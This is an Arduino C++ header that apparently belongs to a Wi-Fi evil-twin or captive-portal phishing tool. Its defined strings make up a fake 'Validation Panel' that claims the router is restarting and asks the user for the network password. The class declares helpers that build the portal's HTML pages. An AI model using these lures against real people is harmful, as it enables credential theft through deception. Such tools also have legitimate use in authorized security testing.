#ifndef UTILS_H
#define UTILS_H

#include <Arduino.h>

#define SUBTITLE "Validation Panel"
#define TITLE "Sign in:"
#define BODY "Due to internal problems router is being restarted. Enter password to re-connect to the network."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 1 minute for device connection.</br>Thank you."

class Utils
{
public:
    static String bytesToStr(const uint8_t *b, uint32_t size);
    static String getTempHTML();
    static String getHeaderHTML(const String &title, const String &ssid, const String &subtitle);
    static String getIndexHTML();
    static String getPostedHTML();
    static String getFooterHTML();
};

#endif // UTILS_H